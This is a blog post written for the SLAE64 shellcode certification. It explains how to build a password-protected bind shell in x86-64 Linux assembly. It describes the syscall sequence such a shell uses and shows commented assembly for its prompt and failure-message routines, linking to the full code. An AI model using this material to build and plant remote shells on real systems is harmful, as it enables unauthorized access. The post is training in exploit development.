---
layout: post
title: Password-protected Bind TCP Shell
date: 2021-01-14 13:44:00
categories: posts
comments: false
en: true
---
#### Introduction

These series of posts starting with the prefix "SLAE64 - Assignment" will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a 
close look at Linux Bind Shells with password protection. 

A Bind shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Reverse Shell, binding to a local port of 
the compromised system, instead of arranging a specific connection on a trivial address. Furthermore, after the connection is established, a shell is executed, granting 
interaction to the attacker

The first assignment from the seven is divided in two sections:

+ A: Requires the creation of a Bind Shell with password protection through the Assembly language, and converting such into shellcode. 
+ B: The discussed Bind Shell provided during the course should be modified, in order that it no longer possesses any form of NULL bytes (00). 

As exercise A is already quite a complex and long exercise, the first assignment will be segmented in two different posts, thing which may repeat within the second assignment.
Moreover, the main idea of a Bind Shell and process of programming such has already been explored [here](https://whitecr0wz.github.io/posts/SLAE-Bind/). Therefore, I thought of 
focusing the blogs topic on the new addition regarding the password protection instead, which is by itself rather complex. 

##### Theory

If you remember the [x86 version of this assignment](https://whitecr0wz.github.io/posts/SLAE-Bind/), you'd remember that the required functions for a Bind Shell are the 
following:

+ Socket

+ Bind

+ Listen

+ Accept

+ Dup2

+ Execve

After the dup2 syscall has been satisfied and executed, the connection should already possess the ability to interact with the other computer. Therefore, we could send a message 
and receive information from the other device. The process will be the following:

+ Socket

+ Bind

+ Listen

+ Accept

+ Dup2

+ Function that is only executed if the comparison ends up not matching. (write failure message)

+ Function that asks for the passcode (write). After the dup2 syscall is initialized, a JMP will be set so that the flow directly continues to this function.

+ Function that reads the input (read).

+ Function that compares the input with the intended passcode. If they do not match, jump to the failure function.

+ Execve

##### Time to stick our hands into the mud

Let's start with the failure function, right after dup2.

The process should be the following.

Arguments required for write according to the man page: ```ssize_t write(int fd, const void *buf, size_t count);```

+ It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1.
+ RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen.
+ RSI will hold temporarely and push the value to print to the screen. 
+ RSI will then copy the value from RSP.
+ DL will be given the length of the entire string.
+ This should write "Incorrect credentials. " into the client's screen.

```term
        jmp question           ; Jump to the "question" function.

halt:

        xor rax, rax           ; Zeroes out RAX.
        xor rdi, rdi           ; Zeroes out RDI.
        xor rsi, rsi           ; Zeroes out RSI.
        xor rdx, rdx           ; Zeroes out RDX.

        push rdi               ; Pushes the NULL DWORD (0x00000000) of RDI into the stack.
        pop rbp                ; Pops the NULL DWORD in RBP.
        push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an 
                               ; additional character that isn't needed (I.E an - or <)

        inc al                 ; Increments AL, giving the value 1 for the syscall write.
        inc rdi                ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen.

        add si, ' '            ; Blank space.
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        mov rsi, 'entials.'    ; Inserts value 'entials.' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        add rsi, 'cred'        ; Inserts value 'cred' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        add si, 't '           ; Inserts value 't ' into SI
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'Incorrec'    ; Inserts value 'Incorrec' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI. The complete phrase should be "Incorrect credentials. "
        mov dl, 34             ; Gives DL the length of the entire string, which should be around 34. If DL is given a bigger value than the real one (I.E 50), the password will 
                               ; be printed when this message pops up.
        syscall                ; The syscall is executed.
```

Great, the failure function has already been set, let us continue with the function "question".

The process should be incredibly similar to the failure function, as the main point of both is to write to the screen:

Arguments required for write according to the man page: ```ssize_t write(int fd, const void *buf, size_t count);```

+ It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1.
+ RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen.
+ RSI will hold temporarely and push the value to print to the screen. 
+ RSI will then copy the value from RSP.
+ DL will be given the length of the entire string.
+ This should write "Introduce your password:" into the client's screen.

```
question:

        xor rax, rax           ; Zeroes out RAX
        xor rdi, rdi           ; Zeroes out RDI
        xor rsi, rsi           ; Zeroes out RSI
        xor rdx, rdx           ; Zeroes out RDX

        push rdi               ; Pushes the NULL DWORD (0x00000000) of RDI into the stack.
        pop rbp                ; Pops the NULL DWORD in RBP.
        push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an 
                               ; additional character that isn't needed (I.E an - or <).

        inc al                 ; Increments AL, giving the value 1 for the syscall write.
        inc rdi                ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen.

        mov rsi, 'assword:'    ; Inserts value 'assword:' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'e your p'    ; Inserts value 'e your p' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'Introduc'    ; Inserts value 'Introduc' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI. The complete phrase should be "Introduce your password:"

        mov dl, 28             ; Gives DL the length of the entire string, which should be around 28. If DL is given a bigger value than the real one (I.E 50), the string will 
                               ; be printed several times and lack certain characters.
        syscall                ; The syscall is executed.
```

You can find the full code [here](https://github.com/whitecr0wz/SLAE/blob/main/SLAE64/Assignment_1/1.asm)

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE64–27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64).
